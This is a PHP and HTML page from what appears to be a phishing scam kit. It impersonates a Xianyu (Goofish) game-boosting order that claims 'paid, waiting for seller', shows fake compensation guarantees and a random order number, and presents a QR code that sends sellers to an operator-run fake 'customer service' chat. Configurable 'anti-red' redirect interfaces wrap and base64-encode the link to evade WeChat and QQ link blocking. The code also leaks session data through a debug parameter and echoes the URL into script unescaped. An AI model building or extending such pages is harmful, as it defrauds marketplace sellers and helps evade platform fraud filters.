<?php
if (!defined('FROM_ROUTER')) {
    http_response_code(403);
    exit('喜乐科技@x60898');
}
session_start();
require_once $_SERVER['DOCUMENT_ROOT'] . '/config/dbconfig.php';
checkLogin(); // 验证登录状态

// 获取当前登录的客服信息
$currentAgent = $_SESSION['username'];

// 生成随机6位客户名称（A-Z, a-z, 0-9）
function generateCustomerName($length = 6) {
    $characters = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

// 生成XEDATA令牌
function generateXEDataToken() {
    return md5(uniqid(mt_rand(), true));
}

// 创建会话记录到 XE-SKDJWKSNCDATA 表
function createChatSession($sessionId, $customerName, $agentAccount, $platform = '闲鱼代练') {
    $db = getDB();
    if (!$db) return false;
    
    $xedataToken = generateXEDataToken();
    $expiresAt = date('Y-m-d H:i:s', strtotime('+7 days'));
    
    $stmt = $db->prepare("INSERT INTO `XE-SKDJWKSNCDATA` 
                         (session_id, xedata_token, customer_name, agent_account, expires_at, platform) 
                         VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssss", $sessionId, $xedataToken, $customerName, $agentAccount, $expiresAt, $platform);
    
    if ($stmt->execute()) {
        return $xedataToken;
    }
    return false;
}


$customerName = generateCustomerName();

// 按照格式构建会话ID：a{customer}z-p{agent}s
$sessionId = 'a' . $customerName . 'z-p' . $currentAgent . 's';
// 生成XEDATA令牌并保存到数据库
$xedataToken = createChatSession($sessionId, $customerName, $currentAgent, '闲鱼代练');

// 获取当前域名和协议
$currentDomain = $_SERVER['HTTP_HOST'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$baseUrl = $protocol . "://" . $currentDomain;

// 生成原始客服链接
$originalServiceUrl = $baseUrl . '/' . "ChatGoofishA" . '?id=' . $sessionId;

// 添加XEDATA参数
if ($xedataToken) {
    $originalServiceUrl .= '&XEDATA=' . $xedataToken;
}

// 获取防红配置（修复版，调整优先级）
function getAntiRedConfig($username) {
     $db = getDB();
    if (!$db) return null;
    
    // 1. 首先检查防红开关是否开启
    $stmt = $db->prepare("SELECT apply_status FROM user_anti_red_config WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
    $config = $result->fetch_assoc();
    
    if (!$config) {
        // 如果没有配置记录，默认防红开关开启
        $apply_status = 'on';
    } else {
        $apply_status = $config['apply_status'];
    }
    
    // 如果防红开关关闭，直接返回null
    if ($apply_status === 'off') {
        return null;
    }
    
    // 2. 防红开关开启的情况下，检查session中是否有应用的接口（付费或免费）
    if (isset($_SESSION['applied_api_url']) && !empty($_SESSION['applied_api_url'])) {
        $type = $_SESSION['applied_domain_type'] ?? 'paid';
        $applied_domain = $_SESSION['applied_domain'] ?? '付费接口';
        
        return [
            'api_url' => $_SESSION['applied_api_url'],
            'apply_status' => 'on',
            'applied_domain' => $applied_domain,
            'encoding_mode' => 'base64',
            'type' => $type
        ];
    }
    
    // 3. 检查session中是否有自定义接口
    if (isset($_SESSION['custom_interface_url']) && !empty($_SESSION['custom_interface_url'])) {
        return [
            'api_url' => $_SESSION['custom_interface_url'],
            'apply_status' => 'on',
            'applied_domain' => isset($_SESSION['custom_interface_remark']) ? $_SESSION['custom_interface_remark'] : '自定义接口',
            'encoding_mode' => isset($_SESSION['custom_encoding_mode']) ? $_SESSION['custom_encoding_mode'] : 'base64',
            'type' => 'custom'
        ];
    }
    
    // 4. 从数据库查询用户配置
    if ($config['apply_status'] === 'on' && !empty($config['applied_domain'])) {
        $applied_domain = $config['applied_domain'];
        
        // 先尝试从免费接口表中查找
        $freeStmt = $db->prepare("SELECT api_url FROM freeantired WHERE name = ? AND status = 'active'");
        $freeStmt->bind_param("s", $applied_domain);
        $freeStmt->execute();
        $freeResult = $freeStmt->get_result();
        
        if ($freeResult->num_rows > 0) {
            // 是免费接口
            $freeData = $freeResult->fetch_assoc();
            $config['api_url'] = $freeData['api_url'];
            $config['type'] = 'free';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 再尝试从付费接口表中查找
        $paidStmt = $db->prepare("SELECT api_url FROM anti_red_links WHERE domain_name = ? AND sold_to = ?");
        $paidStmt->bind_param("ss", $applied_domain, $username);
        $paidStmt->execute();
        $paidResult = $paidStmt->get_result();
        
        if ($paidResult->num_rows > 0) {
            // 是付费接口
            $paidData = $paidResult->fetch_assoc();
            $config['api_url'] = $paidData['api_url'];
            $config['type'] = 'paid';
            $config['encoding_mode'] = 'base64';
            return $config;
        }
        
        // 如果都不是，检查是否是自定义接口（在 userantired 表中）
        $customStmt = $db->prepare("SELECT ua.api_url, ua.encoding 
                                    FROM userantired ua 
                                    JOIN users u ON ua.user_id = u.id 
                                    WHERE u.username = ? AND ua.remark = ? AND ua.status = 'active'");
        $customStmt->bind_param("ss", $username, $applied_domain);
        $customStmt->execute();
        $customResult = $customStmt->get_result();
        
        if ($customResult->num_rows > 0) {
            // 是自定义接口
            $customData = $customResult->fetch_assoc();
            $config['api_url'] = $customData['api_url'];
            $config['encoding_mode'] = $customData['encoding'] ?? 'base64';
            $config['type'] = 'custom';
            return $config;
        }
    }
    
    return null;
}

$antiRedConfig = getAntiRedConfig($currentAgent);
$serviceUrl = $originalServiceUrl;

// 读取源站URL配置
$db = getDB();
$webconfigResult = $db->query("SELECT site_url, site_url_enabled FROM webconfig ORDER BY id DESC LIMIT 1");
$siteUrlConfig = null;
if ($webconfigResult && $webconfigResult->num_rows > 0) {
    $siteUrlConfig = $webconfigResult->fetch_assoc();
}

if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on' && !empty($antiRedConfig['api_url'])) {
    $encoding_mode = $antiRedConfig['encoding_mode'] ?? 'base64';
    
    // 根据编码模式处理URL
    switch ($encoding_mode) {
        case 'base64':
            $encodedUrl = base64_encode($originalServiceUrl);
            break;
        case 'urlencode':
        case 'url':
            $encodedUrl = urlencode($originalServiceUrl);
            break;
        case 'none':
        default:
            $encodedUrl = $originalServiceUrl;
            break;
    }
    
    $serviceUrl = $antiRedConfig['api_url'] . $encodedUrl;
    
    // 调试信息
    error_log("防红接口应用信息: " . json_encode([
        'type' => $antiRedConfig['type'] ?? 'unknown',
        'applied_domain' => $antiRedConfig['applied_domain'] ?? 'unknown',
        'api_url' => $antiRedConfig['api_url'],
        'encoding_mode' => $encoding_mode,
        'original_url' => $originalServiceUrl,
        'encoded_url' => $encodedUrl,
        'final_url' => $serviceUrl
    ]));
} elseif ($siteUrlConfig && !empty($siteUrlConfig['site_url_enabled']) && !empty($siteUrlConfig['site_url'])) {
    $serviceUrl = $siteUrlConfig['site_url'] . base64_encode($originalServiceUrl);
}

// 输出调试信息（开发环境中使用）
if (isset($_GET['debug'])) {
    echo "<!-- 防红配置信息: " . json_encode($antiRedConfig) . " -->\n";
    echo "<!-- 原始URL: $originalServiceUrl -->\n";
    echo "<!-- 最终URL: $serviceUrl -->\n";
    echo "<!-- Session状态: " . json_encode([
        'custom_interface_url' => $_SESSION['custom_interface_url'] ?? '未设置',
        'custom_encoding_mode' => $_SESSION['custom_encoding_mode'] ?? '未设置',
        'custom_interface_remark' => $_SESSION['custom_interface_remark'] ?? '未设置',
        'applied_api_url' => $_SESSION['applied_api_url'] ?? '未设置',
        'applied_domain' => $_SESSION['applied_domain'] ?? '未设置',
        'applied_domain_type' => $_SESSION['applied_domain_type'] ?? '未设置',
        'redirect_to_browser' => $_SESSION['redirect_to_browser'] ?? '未设置'
    ]) . " -->\n";
}

// 生成20位随机订单流水号
function generateOrderNumber($length = 20) {
    $numbers = '0123456789';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $numbers[rand(0, strlen($numbers) - 1)];
    }
    return $randomString;
}

$orderNumber = generateOrderNumber();

// 记录生成的链接信息（用于调试）
error_log("Generated QR Code URL: " . $serviceUrl);
error_log("Original URL: " . $originalServiceUrl);
error_log("Anti-red config: " . ($antiRedConfig ? 'Applied' : 'Not applied'));
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>分享页</title>
	
	<link rel="stylesheet" href="/assets/bootstrap-icons.css">
    <link rel="stylesheet" href="/assets/SharePhoto/main.css">
    <link rel="stylesheet" href="/assets/SharePhoto/xianyudl.css">
</head>
<body>
    <div id="app" data-v-app="">
		<div class="app-container">
			<div class="scroll-container">
				<div class="form-container">
					<div class="form-row">
                    <label>防红</label>
                    <a class="form-link anti-red-link" id="anti-red-status">
                            <?php 
                            if ($antiRedConfig && $antiRedConfig['apply_status'] === 'on') {
                                echo '已配置 (' . $antiRedConfig['applied_domain'] . ')';
                            } else {
                                echo '未配置';
                            }
                            ?> </a>
                         <!-- 移除刷新按钮 -->
                    <div class="copy-link-btn" id="copy-link-btn">
                        <svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="18" height="18">
                            <path
                                d="M761.088 715.3152a38.7072 38.7072 0 0 1 0-77.4144 37.4272 37.4272 0 0 0 37.4272-37.4272V265.0112a37.4272 37.4272 0 0 0-37.4272-37.4272H425.6256a37.4272 37.4272 0 0 0-37.4272 37.4272 38.7072 38.7072 0 1 1-77.4144 0 115.0976 115.0976 0 0 1 114.8416-114.8416h335.4624a115.0976 115.0976 0 0 1 114.8416 114.8416v335.4624a115.0976 115.0976 0 0 1-114.8416 114.8416z"
                                p-id="5993" fill="#515151"></path>
                            <path
                                d="M589.4656 883.0976H268.1856a121.1392 121.1392 0 0 1-121.2928-121.2928v-322.56a121.1392 121.1392 0 0 1 121.2928-121.344h321.28a121.1392 121.1392 0 0 1 121.2928 121.2928v322.56c1.28 67.1232-54.1696 121.344-121.2928 121.344zM268.1856 395.3152a43.52 43.52 0 0 0-43.8784 43.8784v322.56a43.52 43.52 0 0 0 43.8784 43.8784h321.28a43.52 43.52 0 0 0 43.8784-43.8784v-322.56a43.52 43.52 0 0 0-43.8784-43.8784z"
                                p-id="5994" fill="#515151"></path>
                        </svg>
                        <div>复制链接</div>
                    </div>
                </div>
					<div class="form-row">
						<label>价格</label>
						<input type="text" id="price-input" placeholder="输入金额">
					</div>
					<div class="form-row">
						<label>扫码</label>
						<select id="pay-select">
							<option value="微信">微信(推荐)</option>
							<option value="支付宝">支付宝</option>
							<option value="QQ">QQ</option>
							<option value="百度">百度</option>
							<option value="浏览器">浏览器</option>
						</select>
					</div>
				</div>
				<!-- 预览区域开始 -->
				<div class="preview-section">
					<div class="preview-content">
						<svg version="1.1" xmlns="http://www.w3.org/2000/svg" style="display: none;">
							<symbol id="bold-arrow-down">
								<path
									d="M52.335 261.072c-31.269 30.397-31.269 79.722 0 110.194l403.212 391.718c31.325 30.382 82.114 30.382 113.377 0l403.197-391.718c31.325-30.466 31.325-79.793 0-110.194-31.28-30.449-82.058-30.449-113.39 0l-346.497 336.64-346.457-336.64c-31.325-30.448-82.105-30.448-113.446 0l0 0z"
									fill="#272636"></path>
							</symbol>
						</svg>
						<div class="preview-header">
							<svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
								<use xlink:href="#arrow-left"></use>
							</svg>
							<svg class="" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="20" height="20">
								<use xlink:href="#three-points"></use>
							</svg>
						</div>
						<div class="preview-body">
							<div class="preview-title">
								<div>已付款，等待卖家上号</div>
								<div class="preview-title-icon">
									<svg viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="12" height="12">
										<use xlink:href="#bold-arrow-down"></use>
									</svg>
								</div>
							</div>
							<div class="steps-container">
								<div class="step-line"></div>
								<div class="step-line dotted"></div>
								<img src="/assets/img/goofishshare.png" alt="" class="platform-icon">
								<!-- 步骤区域 -->
								<div class="step left-edge">
									<div class="step-icon">
										<div class="step-dot completed">√</div>
									</div>
									<div id="step-1">已下单</div>
								</div>
								<div class="step">
									<div class="step-icon">
										<div class="step-dot"></div>
									</div>
									<div id="step-2">联系客服</div>
								</div>
								<div class="step">
									<div class="step-icon">
										<div class="step-dot"></div>
									</div>
									<div id="step-3">客服验收</div>
								</div>
								<div class="step right-edge">
									<div class="step-icon">
										<div class="step-dot"></div>
									</div>
									<div id="step-4">确认收货</div>
								</div>
							</div>
							<div class="info-box">
								<div class="info-title">商品交易规则</div>
								<div> 卖家打开<span class="highlight-text" id="preview-pay-type">微信</span>扫码联系客服配合完成交易账号的<span class="highlight-text">代练操作</span>，稍后等待买家<span class="highlight-text">确认收货</span>完成交易 </div>
							</div>
							<div class="card customer-service">
								<h2 class="customer-service-title">交易客服</h2>
								<p class="customer-service-subtitle"> 请勿将二维码泄露他人, 保存二维码提示卖家使用<span class="TG-gWE971MRl-XEhxzc8">浏览器</span>扫码配合上号代练。 </p>
								<div class="service-row">
									<div class="service-item">
										<img class="agent-avatar" src="/assets/img/xy-kf.png" alt="">
										<span class="agent-status">交易员已接单 等待确认</span>
									</div>
									<img class="image-connector" src="/assets/img/xylink.png" alt="">
									<div class="service-item">
										<div id="qrcode"></div>
										<span class="qr-label">VIP 代练客服 (闲小蜜)</span>
									</div>
								</div>
								<div class="service-notice">
									<svg class="icon icon-yellow mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
										<path fill="currentColor" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10s10-4.5 10-10S17.5 2 12 2m-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8z"></path>
									</svg>
									<p class="font-medium">因高峰期间被买家所支付下单后会出现未显示支付订单!</p>
								</div>
							</div>
							<div class="card order-info">
								<svg class="order-info-bg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
									<path fill="currentColor" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10s10-4.5 10-10S17.5 2 12 2m-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8z"></path>
								</svg>
								<div class="order-info-content">
									<div class="order-title">
										<h3 class="order-main-title">订单信息</h3>
										<span class="order-badge">放心充</span>
									
									</div>
									<div class="order-details">
										<div class="detail-row">
											<span class="detail-label">实付款:</span>
											<span class="detail-value" id="preview-payment">0元</span>
										</div>
										<div class="detail-row">
											<span class="detail-label">包赔保障:</span>
											<span class="detail-value"> 卖家包赔险已生效 <span class="permanent-badge">永久包赔</span>
												<svg class="icon icon-gray" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
													<path fill="currentColor" d="M8.59 16.58L13.17 12L8.59 7.41L10 6l6 6l-6 6z"></path>
												</svg>
											</span>
										</div>
										<div class="detail-row">
											<span class="detail-label">宝贝快照:</span>
											<span class="detail-value"> 发生交易争议时, 可作为判断依据 <svg class="icon icon-gray" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
													<path fill="currentColor" d="M8.59 16.58L13.17 12L8.59 7.41L10 6l6 6l-6 6z"></path>
												</svg>
											</span>
										</div>
										<div class="detail-row">
											<span class="detail-label">支付方式:</span>
											<span class="detail-value">在线支付</span>
										</div>
										<div class="detail-row">
											<span class="detail-label">交易流水号:</span>
											<span class="detail-value" id="order-serial"><?php echo $orderNumber; ?></span>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- 预览区域结束 -->
			</div>
		</div>
	</div>
	<script src="/assets/qrcode.min.js"></script>
	<script src="/assets/qrcode-helper.js"></script>
	<script>
		// 生成二维码 - 使用PHP动态生成的链接
		var qrCodeUrl = "<?php echo $serviceUrl; ?>";
		
		document.addEventListener('DOMContentLoaded', function() {
		    // 生成客服二维码
		    var qrcodeContainer = document.getElementById("qrcode");
		    try {
		        new QRCode(qrcodeContainer, {
		            text: qrCodeUrl,
		            width: getQRSize(qrCodeUrl, 110),
		            height: getQRSize(qrCodeUrl, 110),
		            colorDark: "#000000",
		            colorLight: "#ffffff",
		            correctLevel: getQRCorrectLevel(qrCodeUrl)
		        });
		    } catch(e) {
		        console.error('QR码生成失败，尝试降级:', e);
		        try {
		            qrcodeContainer.innerHTML = '';
		            new QRCode(qrcodeContainer, {
		                text: qrCodeUrl,
		                width: 140,
		                height: 140,
		                colorDark: "#000000",
		                colorLight: "#ffffff",
		                correctLevel: QRCode.CorrectLevel.L
		            });
		        } catch(e2) {
		            qrcodeContainer.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;width:110px;height:110px;background:#f5f5f5;border-radius:8px;color:#999;font-size:12px;text-align:center;padding:10px;">二维码生成失败</div>';
		        }
		    }
		    
		    // 在二维码中间添加logo图标
		    var logoImg = document.createElement('img');
		    logoImg.src = '/assets/img/xylogo.png';
		    logoImg.style.position = 'absolute';
		    logoImg.style.top = '50%';
		    logoImg.style.left = '50%';
		    logoImg.style.transform = 'translate(-50%, -50%)';
		    logoImg.style.width = '20px';
		    logoImg.style.height = '20px';
		    logoImg.style.borderRadius = '4px';
		    logoImg.style.background = 'white';
		    logoImg.style.padding = '2px';
		    logoImg.style.boxShadow = '0 0 4px rgba(0,0,0,0.2)';
		    qrcodeContainer.style.position = 'relative';
		    qrcodeContainer.appendChild(logoImg);
		    
		    // 实时更新预览区域
		    var priceInput = document.getElementById('price-input');
		    var paySelect = document.getElementById('pay-select');
		    var previewPayType = document.getElementById('preview-pay-type');
		    var previewPayment = document.getElementById('preview-payment');
		    
		    // 价格输入监听
		    priceInput.addEventListener('input', function() {
		        var price = this.value;
		        if (price) {
		            previewPayment.textContent = price + '元';
		        } else {
		            previewPayment.textContent = '0元';
		        }
		    });
		    
		    // 支付方式监听
		    paySelect.addEventListener('change', function() {
		        previewPayType.textContent = this.value;
		    });
		    
		    // 初始化显示
		    previewPayType.textContent = paySelect.value;
		    
		    // 复制链接功能
		    var copyLinkBtn = document.getElementById('copy-link-btn');
		    if (copyLinkBtn) {
		        copyLinkBtn.addEventListener('click', function() {
		            copyToClipboard(qrCodeUrl);
		        });
		    }
		});
		
		// 复制函数
		function copyToClipboard(text) {
		    return new Promise(function(resolve, reject) {
		        if (navigator.clipboard && window.isSecureContext) {
		            navigator.clipboard.writeText(text).then(function() {
		                resolve(true);
		            }).catch(function(err) {
		                console.error('复制失败:', err);
		                fallbackCopy(text, resolve, reject);
		            });
		        } else {
		            fallbackCopy(text, resolve, reject);
		        }
		    }).then(function(success) {
		        if (success) {
		            showToast('链接已复制到剪贴板！', 'success');
		        } else {
		            showToast('复制失败，请手动复制', 'error');
		        }
		    });
		}
		
		function fallbackCopy(text, resolve, reject) {
		    var textArea = document.createElement("textarea");
		    textArea.value = text;
		    textArea.style.position = "fixed";
		    textArea.style.left = "-999999px";
		    textArea.style.top = "-999999px";
		    document.body.appendChild(textArea);
		    textArea.focus();
		    textArea.select();
		    try {
		        var successful = document.execCommand('copy');
		        document.body.removeChild(textArea);
		        resolve(successful);
		    } catch (err) {
		        console.error('复制失败:', err);
		        document.body.removeChild(textArea);
		        resolve(false);
		    }
		}
		
		// 通知函数
		function showToast(message, type) {
		    var container = document.getElementById('notification-container');
		    if (!container) {
		        container = document.createElement('div');
		        container.id = 'notification-container';
		        container.className = 'notification-container';
		        document.body.appendChild(container);
		    }
		
		    var toast = document.createElement('div');
		    toast.className = 'new-user-toast notification-enter-active';
		    if (type) {
		        toast.classList.add(type);
		    }
		
		    var icon = document.createElement('div');
		    icon.className = 'toast-icon';
		    icon.textContent = type === 'error' ? '!' : '✓';
		    toast.appendChild(icon);
		
		    var text = document.createElement('div');
		    text.className = 'toast-text';
		    text.textContent = message;
		    toast.appendChild(text);
		
		    var closeBtn = document.createElement('button');
		    closeBtn.className = 'toast-close';
		    closeBtn.innerHTML = '&times;';
		    closeBtn.addEventListener('click', function() {
		        removeToast(toast);
		    });
		    toast.appendChild(closeBtn);
		
		    container.appendChild(toast);
		
		    setTimeout(function() {
		        toast.classList.add('notification-leave-active');
		        setTimeout(function() {
		            removeToast(toast);
		        }, 300);
		    }, 4000);
		
		    function removeToast(toast) {
		        if (toast.parentNode) {
		            toast.parentNode.removeChild(toast);
		        }
		    }
		}
	</script>
</body>
</html>